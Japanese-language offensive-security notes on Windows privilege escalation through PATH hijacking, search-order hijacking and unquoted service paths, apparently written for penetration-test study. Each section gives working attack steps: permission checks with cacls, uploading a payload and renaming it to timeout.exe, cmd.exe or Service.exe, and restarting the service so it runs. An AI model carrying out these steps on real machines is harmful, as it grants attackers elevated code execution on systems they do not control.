攻撃者が実行ファイルを意図した実行ファイルよりも先に実行される場所に配置できる場合に発生する脆弱性の一種

## Path Environment Variable
環境変数の取得
```
env
# 実行結果
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Wi...
```
### 概要
Windowsは `net.exe` などの相対パス実行時に、PATH変数に列挙されたディレクトリを順に検索して実行ファイルを探す。

| 種別      | レジストリキー                                                             | 変更権限         |
| ------- | ------------------------------------------------------------------- | ------------ |
| User    | `HKCU\Environment`                                                  | 各ユーザーが自由に変更可 |
| Machine | `HKLM\System\CurrentControlSet\Control\Session Manager\Environment` | 管理者のみ        |
- ユーザープロセスは **Machine + User** のPATHを使用
- システムプロセスは **Machineのみ** を使用
### 悪用条件
ソフトウェアインストーラーがSystem32より**前に**独自ディレクトリをPATHへ追加し、かつそのディレクトリが**標準ユーザーに書き込み可能**な場合に成立する。

ディレクトリの権限確認
```
# Python等がC直下にインストールされた場合の例 Path=C:\Python313\Scripts\;C:\Python313\;C:\Windows\system32;... 
# 書き込み権限確認 
cacls C:\Python313\Scripts\ 
# → Authenticated Users: C (Read/Write/Execute/Delete)
```

攻撃例（timeout.exe乗っ取り）
```bash
cd C:\Python313\Scripts
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe timeout.exe
```

## Search Order Hijacking
### APIごとの検索順序

**WinExec API** の検索順序：

1. 実行ディレクトリ（バイナリが存在するディレクトリ）
2. カレントワーキングディレクトリ
3. System32
4. 16bit Systemディレクトリ
5. Windowsディレクトリ
6. PATH環境変数内のディレクトリ
   
**CreateProcess API** の挙動：

| パラメータ                  | 検索挙動              |
| ---------------------- | ----------------- |
| `lpApplicationName` あり | カレントワーキングディレクトリのみ |
| `lpCommandLine` のみ     | 上記WinExec順と同様     |

> サービスのデフォルトCWDは `C:\Windows\System32` のため、PATH変数を用いた `cmd.exe` のハイジャックは**不可**。乗っ取るには実行ディレクトリへの書き込み権限が必要。

### 攻撃手順（例：cmd.exe の乗っ取り）

```bash
# 実行ディレクトリへの権限確認
cacls "C:\Program Files\Bad Windows Service\Service Executable"
# → Authenticated Users: (CI)(OI)F（フルコントロール）

cd "C:\Program Files\Bad Windows Service\Service Executable"
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe cmd.exe
```

## Unquoted Path
### 概要

`lpCommandLine` にスペースを含むパスが**クォートなし**で渡された場合、CreateProcessはスペース区切りで以下のように順に解釈して実行を試みる。

```
C:\Program Files\Bad Application\Bad Program.exe の場合：

C:\Program
C:\Program.exe
C:\Program Files\Bad
C:\Program Files\Bad.exe
C:\Program Files\Bad Application\Bad
C:\Program Files\Bad Application\Bad.exe
C:\Program Files\Bad Application\Bad Program.exe      ← 正規
C:\Program Files\Bad Application\Bad Program.exe.exe
```

### 悪用条件

サービスのバイナリパスが**スペースを含み、かつアンクォート**である場合に成立。

```bash
# 脆弱なサービスの確認
sc_enum
# BINARY_PATH_NAME: C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
# ← クォートなし ＝ 脆弱
```

### 攻撃手順

```bash
# 書き込み可能な中間パスを確認
cacls "C:\Program Files\Bad Windows Service"
# → Authenticated Users: (CI)(OI)F

cd "C:\Program Files\Bad Windows Service"
upload C:\Payloads\dns_x64.svc.exe      # ← サービス用ペイロードを使用
mv dns_x64.svc.exe Service.exe          # "Service.exe" として解釈される位置に配置

# サービスの再起動で実行
sc_stop BadWindowsService
sc_start BadWindowsService
```

> **注意：** サービス再起動の権限がない場合は、次回のOSリブートまで待機が必要。サービス用ペイロード（`svc.exe`）を使用すること。